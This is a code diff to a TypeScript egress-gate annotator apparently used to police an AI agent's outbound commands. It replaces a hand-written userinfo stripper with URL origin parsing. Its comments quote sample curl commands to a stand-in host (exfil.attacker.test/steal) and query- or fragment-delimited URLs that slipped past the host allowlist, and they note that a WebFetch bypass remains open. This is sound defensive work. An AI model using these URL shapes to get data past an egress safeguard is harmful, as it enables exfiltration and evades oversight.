@@ -26,30 +26,66 @@
  * first is what keeps the gate from deciding about strings that are not
  * destinations at all.
  *
- * WHY THE EXTRACTED URL IS NOT HANDED OVER VERBATIM. `host_of()` takes the
- * substring after the scheme, splits it on "/", takes index 0, splits THAT on
- * ":" and takes index 0 again -- so it reads the userinfo of a URL that has one
- * as the host. Measured against the shipped allowlist through a Guardian
- * started from this tree with this stripping removed:
- * `curl https://docs.anthropic.com:pw@exfil.attacker.test/steal` was ALLOWED,
- * because `docs.anthropic.com:pw@exfil.attacker.test` splits at the ":" into
- * `docs.anthropic.com`, which `*.anthropic.com` covers. The credential-free
- * form `https://docs.anthropic.com@exfil.attacker.test/steal` was denied, but
- * for the wrong host: no ":" splits it, so the gate compared the whole
- * `docs.anthropic.com@exfil.attacker.test` against the allowlist and missed.
- * Removing the userinfo makes both resolve to the host the request actually
- * reaches -- measured through the Guardian this file ships in, both deny with
- * `destination exfil.attacker.test not in allowlist`. It also stops the inverse
- * false positive: handed `https://evil.test@docs.anthropic.com/x` verbatim, the
- * gate denies an allowlisted host, and handed the stripped form it does not --
- * measured by evaluating `deny_egress` directly against that allowlist.
+ * WHY THE GATE IS HANDED AN ORIGIN RATHER THAN THE URL AS MATCHED.
+ * `host_of()` takes the substring after the scheme, splits it on "/", takes
+ * index 0, splits THAT on ":" and takes index 0 again. That is not a URL parse,
+ * and three separate shapes get past it -- all three measured against the
+ * shipped allowlist, through a Guardian started from this tree, with the URL
+ * handed over as matched:
  *
- * This is a correction to the string this module CHOOSES to supply, not to the
- * gate. The same misreading is still live on the path that does not come
+ *   curl https://docs.anthropic.com:pw@exfil.attacker.test/steal   ALLOWED
+ *   curl https://metadata?x=@docs.anthropic.com                    ALLOWED
+ *   curl https://internal-api#@docs.anthropic.com                  ALLOWED
+ *
+ * The first is a userinfo carrying a ":": the split at that ":" answers
+ * `docs.anthropic.com`, which `*.anthropic.com` covers. The second and third
+ * need no userinfo at all -- an authority ends at the first of "/", "?" or "#",
+ * `host_of()` bounds only at "/", so the query or fragment text joins the
+ * "host", and the allowlist glob's "*" swallows it whenever the real host has
+ * NO DOT IN IT. That last condition is what turns a parsing nit into a bypass:
+ * dotless names are internal ones -- `metadata`, `internal-api` -- which is
+ * exactly the class an egress gate is deployed for. `curl` reaches `metadata`
+ * and `internal-api` for those two (measured with `curl -w '%{url.host}'`).
+ *
+ * So this module hands over `new URL(...).origin`, not the matched text. An
+ * origin is scheme, host and port and nothing else: it CANNOT carry a userinfo,
+ * a query or a fragment, so every shape above collapses to the host the request
+ * actually reaches, and `host_of()`'s remaining job -- split the port off -- is
+ * one it does correctly. Measured, all three deny after the change.
+ *
+ * THREE HAND-ROLLED NORMALISERS PRECEDED THIS ONE, AND EACH LEAKED A DIFFERENT
+ * SHAPE. The first handed the URL over as matched; the second stripped userinfo
+ * but bounded the authority at "/" alone, which re-opened the class on
+ * query-delimited and fragment-delimited authorities; the third bounded at "/",
+ * "?" and "#" and still left the dotless-host shape, because that one is not
+ * about the bound at all. Three rounds, three shapes: the defect was hand-
+ * rolling the parse, so the parse is no longer hand-rolled. Do not reintroduce
+ * a bespoke normaliser beside this one -- two answers to "what is the host"
+ * is the same two-declarations-of-one-fact hazard the policy-target argument
+ * table exists to remove.
+ *
+ * WHAT AN ORIGIN DROPS, AND WHY IT COSTS NOTHING HERE. The path, query and
+ * fragment go. The gate consults only `host_of(dest)`, so today none of them
+ * was ever read, and the message AGT emits names a host either way. The one
+ * deployment this would matter to is one that pointed
+ * `cfg.egress.destination_paths` at a rule expecting a whole URL at this
+ * address -- a path this repository does not ship and a change that would have
+ * to be made deliberately.
+ *
+ * TWO EFFECTS IN THE PERMISSIVE DIRECTION, BOTH MEASURED AND BOTH RECORDED
+ * RATHER THAN DISCOVERED LATER. `new URL` lowercases the host, and the
+ * allowlist glob is case-sensitive, so `curl https://DOCS.ANTHROPIC.COM/x`
+ * denied before this change and allows after it. That is correct -- DNS is
+ * case-insensitive and the request reaches the allowlisted host either way --
+ * but it is a widening, and it is stated as one. `curl https://EVIL.TEST/x`
+ * still denies, and so does `curl https://docs.anthropic.com.evil.test/x`.
+ *
+ * THIS IS A CORRECTION TO THE STRING THIS MODULE CHOOSES TO SUPPLY, NOT TO THE
+ * GATE. The same misreadings are still live on the path that does not come
  * through here: a fetch tool's own `url` argument is the gate's FIRST declared
  * destination path, read by `host_of()` directly with nothing in between, so
- * `WebFetch` of the same colon-bearing URL is still allowed. Closing that would
- * mean editing `policy/lib/egress.rego`, which is AGT's file, held
+ * `WebFetch` of the colon-bearing URL above is still allowed. Closing that
+ * would mean editing `policy/lib/egress.rego`, which is AGT's file, held
  * byte-identical by `bun run verify:pin`. It is recorded as a measured
  * limitation instead -- see the runbook section on what this does not catch.
  *
@@ -105,53 +141,10 @@ function isPlainObject(value: unknown): value is Record<string, unknown> {
 }
 
 /**
- * The same URL with any userinfo removed -- everything between the "://" and
- * the "@" that ends the authority, the "@" included.
- *
- * Bounded at the first "/", "?" or "#" after the scheme, because only an "@"
- * ahead of all three is userinfo. `https://exfil.attacker.test/mail@host` has
- * its "@" inside the path and is returned unchanged; stripping there would
- * rewrite the host out of a URL that never had a credential in it.
- *
- * ALL THREE DELIMITERS, AND THE TWO THAT ARE EASY TO FORGET ARE THE DANGEROUS
- * ONES. RFC 3986 ends an authority at the first of "/", "?" or "#", and the
- * character class this module matches URLs with admits "?" and "#" -- so a
- * bound taken at "/" alone reads a query or fragment as part of the authority.
- * Measured through a Guardian started from this tree with the bound at "/"
- * only: `curl https://evil.test?x=a@docs.anthropic.com` and
- * `curl https://evil.test#a@docs.anthropic.com` were both ALLOWED, because the
- * strip discarded `evil.test` and answered `https://docs.anthropic.com`, which
- * the allowlist covers -- while `curl` itself resolves `evil.test` for both
- * (measured with `curl -w '%{url.host}'`). That is the same bypass class this
- * whole helper exists to close, re-opened by the normalisation meant to close
- * it, and reachable without any userinfo at all: an attacker appends
- * `?x=a@<allowlisted-host>` to a path-less URL they already control. Both forms
- * deny now, and the two tests below are the ones that would have caught it.
- *
- * The LAST "@" in the authority is the delimiter, not the first: a userinfo may
- * itself contain one, and the host is what follows the final "@".
- *
- * Total by construction and by intent -- string in, string out, no throw on any
- * input, including one with no scheme, no authority or nothing after the "@".
- * A URL this cannot make sense of is returned as it arrived, and the gate then
- * decides about that string exactly as it would have without this step.
- */
-function withoutUserinfo(url: string): string {
-  const schemeEnd = url.indexOf("://");
-  if (schemeEnd === -1) return url;
-  const afterScheme = url.slice(schemeEnd + "://".length);
-  const authorityEnd = afterScheme.search(/[/?#]/);
-  const authority = authorityEnd === -1 ? afterScheme : afterScheme.slice(0, authorityEnd);
-  const userinfoEnd = authority.lastIndexOf("@");
-  if (userinfoEnd === -1) return url;
-  return url.slice(0, schemeEnd + "://".length) + afterScheme.slice(userinfoEnd + 1);
-}
-
-/**
  * Answers `{destination}` when it finds one, `{}` when it does not. The
- * destination is the matched URL with its userinfo removed, not the matched URL
- * verbatim -- see `withoutUserinfo` and the module header for the measurement
- * that makes the difference a denial rather than an allow.
+ * destination is the matched URL's ORIGIN -- scheme, host and port -- not the
+ * matched text; see the module header for the three measured shapes that makes
+ * the difference between a denial and an allow.
  *
  * Never a throw and never `null`, and both halves are load-bearing. AGT turns
  * any annotator failure -- thrown or rejected -- into its own
@@ -183,5 +176,19 @@ export function annotateEgressDestination(_name: string, _config: unknown, preli
   if (typeof rawCommand !== "string") return {};
 
   const found = DESTINATION_IN_COMMAND.exec(rawCommand);
-  return found === null ? {} : { destination: withoutUserinfo(found[0]) };
+  if (found === null) return {};
+
+  // `new URL` throws on input it cannot parse, and this function may not: a
+  // throw here becomes AGT's own `runtime_error:annotation_failed` deny on
+  // every call in the deployment. So an unparseable match is answered the same
+  // way a command with no URL in it is -- `{}`, no destination, unexamined
+  // rather than denied. The regex is scheme-anchored, so a match always carries
+  // one, and the catch is for the shapes a scheme alone does not make valid.
+  let parsed: URL;
+  try {
+    parsed = new URL(found[0]);
+  } catch {
+    return {};
+  }
+  return { destination: parsed.origin };
 }
